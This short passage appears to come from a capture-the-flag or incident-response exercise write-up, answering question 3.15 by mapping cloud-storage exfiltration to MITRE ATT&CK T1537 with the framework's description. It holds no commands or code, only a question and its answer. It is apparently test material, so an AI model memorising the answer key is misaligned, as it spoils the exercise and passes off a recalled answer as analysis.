3.15


From we can see, it looks like the attacker gained access to the cloud storage and began exfiltrating copies of all the documents they found onto their own cloud account.

What is the MITRE ATT&CK ID of this attack?

T1537

ID: T1537
Name: Transfer Data to Cloud Account
Tactic: Exfiltration
Description: Adversaries transfer data from a victim's cloud environment to another cloud account they control on the same service, often using built-in sharing, syncing, backup, or cloud APIs.


